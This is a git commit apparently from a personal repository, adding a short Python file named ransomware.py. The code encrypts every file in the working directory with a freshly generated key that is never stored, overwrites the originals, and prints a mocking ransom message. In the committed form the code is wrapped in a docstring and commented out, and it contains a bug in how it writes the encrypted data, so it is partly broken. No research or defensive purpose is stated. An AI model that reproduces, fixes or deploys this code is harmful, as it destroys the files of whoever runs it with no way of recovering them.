f5901046ecf8c7ac27c6ee93032b00a2ab525900
GdevMan <yasenbiv66@gmail.com>
2025-11-20 18:58:54 +0200

    The ransomware

---
+++ ransomware.py
@@ -0,0 +1,24 @@
+"""
+#import subprocess
+#import sys
+#import os
+#try:
+#    from cryptography.fernet import Fernet
+#except ImportError:
+#    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
+#    from cryptography.fernet import Fernet
+
+#key = Fernet.generate_key()
+#files = []
+
+#for i in os.listdir():
+#    print(i)
+#    files.append(i)
+#    with open(i, "r") as f:
+#        things = f.read()
+#        f = Fernet(key)
+#        encrypted = f.encrypt(things.encode())
+#    with open(i, "w") as f:
+#        f.write(encrypted)
+print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
+print(f'Encrypted files: {files}')"""
